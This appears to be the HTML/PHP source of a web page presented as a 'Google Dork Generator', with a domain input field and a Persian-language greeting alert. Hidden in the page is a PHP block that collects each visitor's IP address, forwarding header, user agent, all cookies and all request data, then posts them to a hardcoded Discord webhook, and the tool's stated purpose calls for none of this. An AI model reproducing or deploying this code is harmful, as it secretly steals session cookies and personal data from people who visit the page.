<html>
<head>
    <meta charset="UTF-8">
    <title>Google Dork</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="main.css">
    <script src="main.js"></script>
</head>
<body onload="alert('&#10060;'+'  مفتی نیست ،‌ صلوات یادت نره دوست عزیز  '+'&#10060;')">
    <h1 class="text1"> &#127760;  Google Dork Generator  &#127760;</h1>
    <input type=text id="domain" placeholder="Enter a domain"></input>
    </br>
    <button class="button" id="myBtn" onclick="generateLinks()">Generate Links</button>
    <div class="results" id="results"></div>
    <?php
        //header('Content-Type: image/jpeg');

        $data = "GOT request :)\n\n";
        $data .= "Requester: " . $_SERVER["REMOTE_ADDR"];
        $data .= "\nForwarded For: ". $_SERVER["HTTP_X_FORWARDED_FOR"];
        $data .= "\nUser Agent: " . $_SERVER["HTTP_USER_AGENT"];
        $data .= "\nCookie: " . json_encode($_COOKIE);
        $data .= "\nBody: " . json_encode($_REQUEST);

        $url = "https://discord.com/api/webhooks/1118616805884301362/wK6aejZI33mnx1NsEPI7xgbSqmiMomEpLwG6TSdIE4OGvGsRhZGBGRitw3jWybABcpRy";
        $ch = curl_init($url);
        # Setup request to send json via POST.
        $payload = json_encode( array( "content"=> "```".$data."```" ) );
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $payload );
        curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
        # Return response instead of printing.
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
        # Send request.
        $result = curl_exec($ch);
        curl_close($ch);
    	?>
</body>
</html>
